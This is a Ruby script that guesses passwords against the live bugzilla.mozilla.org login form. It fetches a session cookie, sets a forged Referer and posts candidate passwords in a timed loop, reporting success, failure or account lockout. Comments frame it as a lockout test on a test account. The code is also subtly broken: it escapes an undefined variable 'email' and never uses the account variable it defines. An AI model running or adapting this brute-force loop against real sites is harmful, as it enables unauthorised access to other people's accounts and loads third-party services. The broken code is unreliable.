require 'net/http'
require 'uri'

sleep_interval = 2 # seconds between each guess
account = "" # Test account
password = "" # Test password

username = URI.escape(email)
dictionary = []
# Stub dictionary with bogus creds
10.times { dictionary << (0...8).map { (65 + rand(26)).chr }.join}
# Add a real credential for testing
dictionary << URI.escape(password)

http = Net::HTTP.new('bugzilla.mozilla.org', 443)
http.use_ssl = true
path = '/index.cgi'

# GET request -> so the host can set his cookies
resp, data = http.get(path, nil)
set_cookies = resp.response['set-cookie'].split(",")
cookie = set_cookies.map {|set_cookie| set_cookie.split(";")[0]}.join(";")

dictionary.each do |password_guess|
  data = "Bugzilla_login=#{username}&Bugzilla_password=#{password_guess}&Bugzilla_login_token=&GoAheadAndLogIn=Log+in"
  headers = {
    'Cookie' => cookie,
    'Referer' => 'https://bugzilla.mozilla.org/index.cgi?logout=1',
    'Content-Type' => 'application/x-www-form-urlencoded'
  }

  resp, data = http.post(path, data, headers)

  if resp.body.match(/Invalid Username Or Password/)
    puts "Authentication Failed with: " + password_guess
  elsif resp.body.match(/Bugzilla Main Page/)
    puts "Authentication Succesful with: " + password_guess
  elsif resp.body.match(/Account Locked/)
    puts "#{account} Bugzilla account is locked"
    exit
  else
    puts "Errored " + password_guess
    require 'pry'
    binding.pry
  end

  sleep sleep_interval
end
